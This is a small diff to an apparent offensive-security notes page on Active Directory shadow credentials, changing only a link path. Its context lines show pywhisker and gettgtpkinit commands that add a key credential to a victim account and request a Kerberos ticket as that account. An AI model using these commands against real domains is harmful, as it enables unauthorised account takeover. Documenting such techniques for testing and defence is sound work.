@@ -25,7 +25,7 @@ pywhisker.py -d example.local -u user -p pass --target 'victim' --action add
 gettgtpkinit.py -cert-pfx cred.pfx example.local/victim victim.ccache
 ```
 
-The write permission on the target's `msDS-KeyCredentialLink` is the prerequisite, usually a `GenericWrite`/`GenericAll` ACL finding over the user or computer object ([ACL enumeration](../../enumeration/acl-enumeration.md)).
+The write permission on the target's `msDS-KeyCredentialLink` is the prerequisite, usually a `GenericWrite`/`GenericAll` ACL finding over the user or computer object ([ACL enumeration](../../dacl/acl-enumeration.md)).
 
 ## Why it is a favourite
 
